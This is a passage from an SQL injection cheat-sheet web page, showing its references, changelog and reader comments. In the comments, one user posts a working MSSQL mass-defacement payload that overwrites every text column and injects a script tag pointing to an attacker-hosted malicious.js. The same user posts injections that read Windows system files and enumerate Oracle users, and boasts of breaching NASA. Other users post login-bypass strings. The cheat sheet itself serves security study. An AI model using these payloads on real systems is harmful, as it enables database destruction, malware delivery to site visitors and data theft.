    -   [More Advanced SQL Injection In SQL
        Applications](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf),
        *Chris Anley*
    -   [Blindfolded SQL
        Injection](http://www.imperva.com/download.asp?id=4), *Ofer Maor
        -- Amichai Shulman*
    -   [Hackproofing
        MySQL](http://www.ngssoftware.com/papers/HackproofingMySQL.pdf),
        *Chris Anley*
    -   [Database Hacker\'s
        Handbook](http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html),
        *David Litchfield, Chris Anley, John Heasman, Bill Grindlay*
    -   **Upstairs Team!**\
        \
-   **MSSQL** **Related**
    -   MSSQL Operators -
        <http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx>
    -   Transact-SQL Reference -
        <http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx>
    -   String Functions (Transact-SQL)  -
        <http://msdn2.microsoft.com/en-us/library/ms181984.aspx>
    -   List of MSSQL Server Collation Names -
        <http://msdn2.microsoft.com/en-us/library/ms180175.aspx>
    -   MSSQL Server 2005 Login Information and some other functions :
        [Sumit Siddharth](http://www.notsosecure.com/)\
        \
-   **MySQL** **Related**
    -   Comments : <http://dev.mysql.com/doc/>
    -   Control Flows -
        <http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html>
    -   MySQL Gotchas -
        [http://sql-info.de/mysql/gotchas.htm](http://sql-info.de/mysql/gotchas.html)
    -   [New SQL Injection
        Concept](http://www.securiteam.com/securityreviews/5KP0N1PC1W.html),
        *Tonu Samuel*

## ChangeLog

-   15/03/2007 - Public Release v1.0
-   16/03/2007 - v1.1
    -   Links added for some paper and book references
    -   Collation sample added
    -   Some typos fixed
    -   Styles and Formatting improved
    -   New MySQL version and comment samples
    -   PostgreSQL Added to Ascii and legends, pg_sleep() added blind
        section
    -   Blind SQL Injection section and improvements, new samples
    -   Reference paper added for MySQL comments
-   21/03/2007 - v1.2
    -   BENCHMARK() sample changed to avoid people DoS their MySQL
        Servers
    -   More Formatting and Typo
    -   Descriptions for some MySQL Function
-   30/03/2007 v1.3
    -   Niko pointed out PotsgreSQL and PHP supports stacked queries
    -   Bypassing second MD5 check login screens description and attack
        added
    -   Mark came with extracting NTLM session idea, added
    -   Detailed Blind SQL Exploitation added
-   13/04/2007 v1.4 - *Release*
    -   SQL Server 2005 enabling xp_cmdshell added (*trick learned from
        mark*)
    -   [Japanese version of SQL Injection Cheat Sheet
        released](http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html)
        (*v1.1*)

## To Do / Contact / Help

I got lots of notes for ORACLE, PostgreSQL, DB2 and MS Access and some
of undocumented tricks in here. They will be available soon I hope. If
you want to help or send a new trick, not here thing just [drop me an
email](http://ferruh.mavituna.com/iletisim/) (*ferruh-at-mavituna.com*).
:::

::: commentlinks
[![Yorum Ekle](/mg/icons/comment_add.png){.abs width="16" height="16"}
Yorumunu
Ekle](/sql-injection-cheatsheet-oku/#addcomment){#/sql-injection-cheatsheet-oku/
.jwritecomment} - [![Yazıcı Versiyonu](/mg/icons/printer.png){.abs
width="16" height="16"} Yazıcı
Versiyonu](/sql-injection-cheatsheet-oku/print/) - [![Yorumlar için
RSS](/mg/icons/commentrss.png){.abs width="16" height="16"} Yorumlar
için RSS](/sql-injection-cheatsheet-oku/rss/)
:::

::: {#relatedarticles}
### İlişkili olabilecek yazılar

-   [SQL Injection Cheat Sheet is Online
    !](/sql-injection-cheat-sheet-is-online-oku/)
-   [SQL Injection Cheat Sheet
    Online!](/sql-injection-cheatsheet-online-oku/)
-   [SQL Injection Cheat Sheet
    Yenilendi](/sql-injection-cheat-sheet-yenilendi-oku/)
:::
:::::::

[]{#comments}

:::: comment
::: commentd
![](/avatar/-1301817992/){width="64" height="64"}
:::

#### Ravendra Patel - *12 gün 3 saat 24 dakika önce*

Thanks so much dear. I\'ll always looking your help\...
::::

:::: comment
::: commentd
![](/avatar/1407825541/){width="64" height="64"}
:::

#### [\"vinnu\"](http://hackingethics.wordpress.com){rel="nofollow"} - *15 gün 5 saat 9 dakika önce*

This is my SQL virus module for Uday virus (SQL+XSS+AJAX):\
\
\';while(1=1) BEGIN DECLARE \@Ta varchar(255),@Co varchar(4000) DECLARE
uday CURSOR FOR select x.name,y.column_name from sysobjects
x,information_schema.columns y where x.name=y.table_name and
x.type=\'U\' and (y.data_type=\'varchar\' or y.data_type=\'text\') OPEN
uday FETCH NEXT FROM uday INTO \@Ta,@Co WHILE(@@FETCH_STATUS=0) BEGIN
exec(\'update \[\'+@Ta+\'\] set \[\'+@Co+\'\]=\'\'\<H2\>Legion Of
Xtremers\</H2\>\<HR\>\<H1\>Owned by LOXians now\...\"vinnu\"\<script
src=\"http://attackerserver/malicious.js\"\>\</script\>\'\' where
\'+@Co+\' not like \'\'XXXX\'\'\')FETCH NEXT FROM uday INTO \@Ta,@Co END
CLOSE uday DEALLOCATE uday commit END\--sp_password\
\
\
It hunts for all varchar or TEXT type columns in all user defined tables
and replaces the values with the malicious values.\
\
\"vinnu\"\
Legion Of Xtremers (India)
::::

:::: comment
::: commentd
![](/avatar/-955206086/){width="64" height="64"}
:::

#### [Tesekkur ederim](http://ferruh.mavituna.com){rel="nofollow"} - *25 gün 4 saat 23 dakika önce*

Really Great Job dude.\
Keep up!\
Respect\
\
Tesekkur ederim Abi![:)](/mg/smilies/smile.gif){width="21" height="22"}
::::

:::: comment
::: commentd
![](/avatar/879388921/){width="64" height="64"}
:::

#### Seagate - *04.03.2010*

Vinnu where can I contact you for a job?
::::

:::: comment
::: commentd
![](/avatar/-1226150521/){width="64" height="64"}
:::

#### vinnu - *16.02.2010*

Jaijeya\
Some tips about MS-Access (Jet database engine):\
\
You should not insert comment characters as Jet db engine doesn\'t
recognise them so avoid them in injection.\
Instead you should try to inject the SQL in such a way that it satisfies
the whole query.\
In most cases the injection can be done in where or order by clauses so
for example:\
if query is like: WHERE title LIKE \'%\<injectionhere\>%\'\
Then do it like: WHERE title LIKE\'%a\' your SQL here WHERE name LIKE
\'a%\'\
\...Likewise.\
To know rest of the query insert a single double quote \" after a single
quote \', in most cases it will reveal the part of query right from
injection point.\
\
It is possible to use other databases or files from query. This can also
be helpful in enumerating the directory structure of the target server.\
Also it is most probable that the server will be windows based if Jet db
engine is there. In this case there exists a file called setuplog.txt
which gets created right at the time of windows installation and it
contains important information about server os and hardware, and it is
compatible to be loaded in a query as a table:\
\
\'+union+select+1,File,Message,Line,Time,6,Tag,8,9,10,11+from+\[TEXT;DATABASE=c:%5Cwindows;HDR=YES;FMT=Delimited\].\[setuplog.txt\]\'\
::::

:::: comment
::: commentd
![](/avatar/1843677050/){width="64" height="64"}
:::

#### [eslimasec](http://wiki.eslimasec.com){rel="nofollow"} - *13.02.2010*

Dear Ferruh,\
\
we developped a small tool to aid Webapptesting that includes many of
your tricks, It can be find
here<http://wiki.eslimasec.com/esliwiki/ProjectsPost>.\
\
hope it is useful 4 u and ya readers.\
\
best regards
::::

:::: comment
::: commentd
![](/avatar/-1637195092/){width="64" height="64"}
:::

#### vinnu - *12.02.2010*

In case of Oracle database server, when union doesn\'t work, then we can
retrieve the desired results randomly. It helped me a lot in Penetrating
into NASA.\
Following type of injection will be helpful in such cases:\
\
\'or+1=utl_inaddr.get_host_address((SELECT+username+FROM+(SELECT+username+FROM+all_users+ORDER+BY+dbms_random.value)+WHERE+rownum=1))\--
::::

:::: comment
::: commentd
![](/avatar/-1637195092/){width="64" height="64"}
:::

#### vinnu - *12.02.2010*

Also in case if u r just pairing single quotes, then u can easily ecape
one of the single quote using a forward slash \"\\\".\
This will again break the SQL query and will inject the parameter as a
SQL query.
::::

:::: comment
::: commentd
![](/avatar/1101713098/){width="64" height="64"}
:::

#### mr.ots - *05.02.2010*

waow.\
this is not going to be a waste bookmark!\
thanks![:)](/mg/smilies/smile.gif){width="21" height="22"}
::::

:::: comment
::: commentd
![](/avatar/-1736017014/){width="64" height="64"}
:::

#### AK213 - *03.02.2010*

Goooood
::::

:::: comment
::: commentd
![](/avatar/225341048/){width="64" height="64"}
:::

#### vinnu - *28.01.2010*

\@Brent Jenkins:\
Well there is a case, when this check can be thwarted, check scenario:\
There are atleast two input fields (mostly user/password) and the fields
are bound to the maxlength, and the maxlength check is also implemented
in server side script e.g. asp, php etc.\
Noiw If u fill the first comming input with single quote \' (SQL meta)
then, above script will try to pair up the single quotes.\
Now if all the space is acquired by single quotes, then above listed
script will try to pair up all the single quotes and this will obviously
increase the size of input variable. Then if, the variable input is
tripped, then it may lead to an unpaired single quotation mark, this
will pair up with the second condition\'s first single quote and will
make second condition as a string and the second input becomes a part of
SQL script and making SQL injection feasible.\
LOX (Legion Of Xtremers)INDIA
::::

:::: comment
::: commentd
![](/avatar/-1524106412/){width="64" height="64"}
:::

#### kai - *31.10.2009*

this sql not working in .aspx login page. can anyone tell me sql
injection to bypass .aspx login page.
::::

:::: comment
::: commentd
![](/avatar/-1506816942/){width="64" height="64"}
:::

#### kristofdpx - *29.09.2009*

Stacked queries didn\'t work with PHP-MYSQL. Tested on PHP 5.2.1 and
Mysql 5.0
::::

:::: comment
::: commentd
![](/avatar/1673518080/){width="64" height="64"}
:::

#### jambo - *27.07.2009*

If this helps at all, follow this link to a page I posted with some
programming help against those SQL Injection attacks!\
Hey. Thanks for the tutorial. It is very complete.
::::

:::: comment
::: commentd
![](/avatar/656648260/){width="64" height="64"}
:::

#### bugman - *02.07.2009*

All the listed cases are true only for those lames who still use
concatenation of user-driven datum to SQL code instead of
parameters-binding mechanism
::::

:::: comment
::: commentd
![](/avatar/-1022016500/){width="64" height="64"}
:::

#### milon - *01.07.2009*

hello\
any one can give me an example how to apply SQL injection in website
details.
::::

:::: comment
::: commentd
![](/avatar/1139031621/){width="64" height="64"}
:::

#### [Kyo](http://wocares.com){rel="nofollow"} - *26.03.2009*

I\'ve got a little tool for generating CHAR() and hex codes for SQL
injections if magic quotes is enabled here:\
\
http://wocares.com/noquote.php\
\
just check SQL Injection
::::

:::: comment
::: commentd
![](/avatar/787188187/){width="64" height="64"}
:::

#### [zniko07](http://www.k-wi.com){rel="nofollow"} - *05.03.2009*

\' OR 1=1\--\
oh i tried to sql inject your comments but it didn\'t
worked![:D](/mg/smilies/grin.gif){width="21" height="22"}! lol\
i really liked your article!! it\'s great! thank you\
\
::::

:::: comment
::: commentd
![](/avatar/902991003/){width="64" height="64"}
:::

#### dave roberts - *27.01.2009*

Thanks so much for the document. Its simply awesome, i m
successful![;)](/mg/smilies/wink.gif){width="21" height="22"}
::::

:::: comment
::: commentd
![](/avatar/-123711581/){width="64" height="64"}
:::

#### [fLaSh](http://www.warezlol.com/){rel="nofollow"} - *31.12.2008*

I really liked the cheatsheet. nice work!\
\
Author of MySQLi Dumper
::::

::: {style="text-align:center;"}
[**1** - [2](/sql-injection-cheatsheet-oku/page/2/#comments) -
[3](/sql-injection-cheatsheet-oku/page/3/#comments) -
[4](/sql-injection-cheatsheet-oku/page/4/#comments) - [İleri
»](/sql-injection-cheatsheet-oku/page/2/#comments) -
[»»](/sql-injection-cheatsheet-oku/page/4/#comments)]{.pagingnormal}
:::

::::: {#commentarticlewrite}
# Yorum Yazın {#addcomment}

> \
> Tüm yorumlar onaydan geçmektedir, bu işlem en uzun 30 dk. sürecektir.
> E-mail adresleri yeni yorumları bildirme harici hiç bir başka amaçla
> kullanılmamaktadır ve sitede gözükmemektedir.

:::: {style="width:100%"}
İsim / Nick :\
Email :

\
Web Sitesi :\

<div>

![Captcha Kodu](/captcha/?908385){.captcha
style="border:1px solid #999;float:right;margin-right:100px" width="150"
height="50"} Sağdaki Resimdeki Numaralar :

</div>
::::
:::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::::: {#navigation}
:::::: section
::: {style="text-align:center"}
:::

## [ferruh.mavituna]{#ferruh}

::: about
Site genel olarak güvenlik, internet ve web teknolojileri üzerine
yazdığım yazılardan oluşmaktadır. Sitede **2003 yılından** bu yana
yazılmış **1750\' den fazla yazı** bulunmaktadır.

Bunun yanında [projeler](/projects-browse/) de geliştirdiğim projeleri,
[ar-ge](/white-papers-browse/) kısmında güvenlik araştırma dokümanlarıma
ulaşabilir, [programlar](/applications-browse/) kısmından yazdığım
yazılımları download edebilirsiniz. [Site hakkında.](/hakkinda-oku/)
:::

::: aboute
List of [english articles](/tag/english/),
[RSS](/search/?s=1&AnyTag=&Tags=english&q=&SearchTitle=&SearchArticle=&SearchTitle=&ExactMatch=&Asc=&Order=&StartDate=&EndDate=&Featured=&OrderByTalk=&OrderByPopulatity=&RSS=1)
or [try this page](/english-browse/).
:::
::::::

::: section
## PROJECTS

-   [Freaking Simple Fuzzer](http://code.google.com/p/fm-fsf/)
-   [Psycho Folder](http://code.google.com/p/psychofolder/)
-   [BSQL Hacker](http://labs.portcullis.co.uk/application/bsql-hacker/)
-   [Win MD5 Checksum Tool](/windows-md5-checksum-tool-oku/)
-   [Hocus
    Pocus](/hocus-pocus-hide-your-applications-anti-boss-style-oku/)
-   [SQL Injection Cheat Sheet](/sql-injection-cheatsheet-oku/)
-   [WebRaider](http://www.mavitunasecurity.com/blog/webraider/)
:::

::: section
## ARAMA

\
[Detaylı Arama](/advancedsearch/)
:::

:::: section
## TAKİP

::: {style="text-align:center"}
[![Siteyi RSS ile Takip Et](/mg/icons/rss.png){width="28"
height="28"}](/rss/) [![Siteyi E-mail ile Takip
Et](/mg/icons/mail.png){width="28"
height="28"}](http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&loc=en_US)
[![RSS
Takipçileri](http://feeds.feedburner.com/~fc/fmavituna?bg=FF99CC&fg=000000&anim=1){height="26"
width="88" style="border:0"}](http://feeds.feedburner.com/fmavituna)\
[![website
stats](http://whos.amung.us/cwidget/s6h5ipp4/f37433ffffff.png){width="81"
height="29"}](http://whos.amung.us/show/s6h5ipp4) [![Follow me on
Twitter](/mg/icons/twitter.png){width="28"
height="28"}](http://twitter.com/fmavituna) [![Follow me on
FriendFeed](/mg/icons/friendfeed.png){width="28"
height="28"}](http://friendfeed.com/fmavituna)
:::
::::

:::: section
## YORUMLAR

::: {#livecomments}
:::
::::

::: section
## CANLI YAYIN

[![View my
FriendFeed](http://friendfeed.com/embed/widget/fmavituna?v=2&hide_logo=1&hide_comments_likes=1&format=png){style="border:0;"}](http://friendfeed.com/fmavituna)
:::

::: section
## KATEGORİLER

-   [Projeler - Programlar](/cat-projects-browse/)
-   -   [BSQL Hacker](/bsql-hacker-and-deep-blind-sql-injections-oku/)
-   [En İyi Yazılar](/cat-featured-browse/)
-   [Güvenlik](/cat-security-browse/)
-   [Yazılım Geliştirme](/cat-development-browse/)
-   [Kitap](/cat-book-browse/)
-   [Kişisel / Hayat](/cat-personal-browse/)
-   [Kişisel Gelişim](/cat-personal-development-browse/)
-   [Online Araçlar ve Projeler](/cat-personal-development-browse/)
-   -   [Encoder / Converter](/tools/converter/)
-   [SQL Injection](/sql+injection-browse/)
-   -   [SQL Injection
        Dersleri](/makale/sql-injection-derslerine-giris/)
    -   [SQL Injection Cheat Sheet](/makale/sql-injection-cheatsheet/)
    -   [ORACLE SQL Injection Cheat
        Sheet](/makale/oracle-sql-injection-cheat-sheet/)
    -   [Record Locator](/makale/record-locater-for-sql-injection/)\
    -   [Error Based SQL
        Injections](/makale/fast-way-to-extract-data-from-error-based-sql-injections/)
-   [**Tüm Kategoriler**](/tags/)
:::

::: section
## ARŞİV

### Senelere Göre Arşivler

-   [2010](/archive/year/2010/) (git say!)
-   [2009](/archive/year/2009/) (40 yazı)
-   [2008](/archive/year/2008/) (147 yazı)
-   [2007](/archive/year/2007/) (358 yazı)
-   [2006](/archive/year/2006/) (299 yazı)
-   [2005](/archive/year/2005/) (356 yazı)
-   [2004](/archive/year/2004/) (350 yazı)
-   [2003](/archive/year/2003/) (245 yazı)

### Diğer Arşiv Erişimleri

-   [Etiket Arşivi](/tags/)
-   [Son Yazılar](/archive/titles/)
-   [En iyi Yazılar](/archive/featured/)
-   [En Popüler Yazılar](/archive/popular/)
-   [En Tırt Yazılar](/archive/looser/)
-   [Çok konuşulan Yazılar](/archive/sensational/)
-   [Kimsenin Takmadığı Yazılar](/archive/whocares/)
:::

 
::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

::::: {#footer}
:::: {align="center"}
::: content
Ferruh Mavituna © 2002-2009\
[Hakkında](/hakkinda-oku/), [İletişim](/contact/),
[Okuduklarım](/newspaper/),
[Mail-List](http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&loc=en_US),
[RSS](/rss/)
:::
::::
:::::
